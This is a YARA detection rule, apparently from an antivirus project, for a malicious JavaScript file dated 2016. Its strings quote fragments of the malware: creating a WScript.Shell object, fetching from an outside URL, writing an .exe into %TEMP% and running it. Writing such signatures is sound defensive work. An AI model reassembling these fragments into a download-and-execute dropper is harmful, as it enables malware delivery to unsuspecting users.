rule sig_20160328_01a0c53e4bf8d195a7a1d3eac8f335c9 {
  meta:
    description = "datamaliciousorder - file 20160328_01a0c53e4bf8d195a7a1d3eac8f335c9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e7f0b0a21291c81c467976f1b11fcf5a621c35d3eea754e531d79d8a2bafa901"

  strings:
    $s1  = "function Hjags() {return Bpzgpgua[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"hCwyGrAZ3x.exe\";};" fullword ascii
    $s2  = "Harlydtf[Albdz](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Uwfuf](Qgcwlvsqgx() * 11)} while (Harlydtf[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Trgmij(Grmbxpi, Prywn){return Grmbxpi - Prywn;};" fullword ascii
    $s5  = "var Bpzgpgua = function Svtvyz() {return WScript[Dhdgvqvf](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Apefpoa(Qbwhkwlnto){Bpzgpgua[\"Run\"](Qbwhkwlnto, Maaczufw, Maaczufw);};" fullword ascii
    $s7  = "function Bmchldoqsc() {return ((Xnesgmvfl == true) && (Xnesgmvfl == Pobhhjfsz)) ? 1 : Maaczufw;};" fullword ascii
    $s8  = "Pobhhjfsz = true; " fullword ascii
    $s9  = "return Trgmij(Nvapubrf, Mxkgui);" fullword ascii
    $s10 = "var Sshwzr = false;" fullword ascii
    $s11 = "var Rrbbbx = new this[\"Date\"]();" fullword ascii
    $s12 = " while (Kdogkpmrsh){" fullword ascii
    $s13 = "function Cdwutofe(){return Eygdqy;};" fullword ascii
    $s14 = "function Lgfcwhliv(){return Dhdgvqvf;};" fullword ascii
    $s15 = "function Iahcwc(Nrtgfzve) {var Cxzgcd = (1, 2, 3, 4, 5, Nrtgfzve); return Cxzgcd;};" fullword ascii
    $s16 = "var Pobhhjfsz = false;" fullword ascii
    $s17 = "Xnesgmvfl = true; " fullword ascii
    $s18 = "var Xnesgmvfl = false;" fullword ascii
    $s19 = "function Kocbocyis()" fullword ascii
    $s20 = "function Qgcwlvsqgx(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}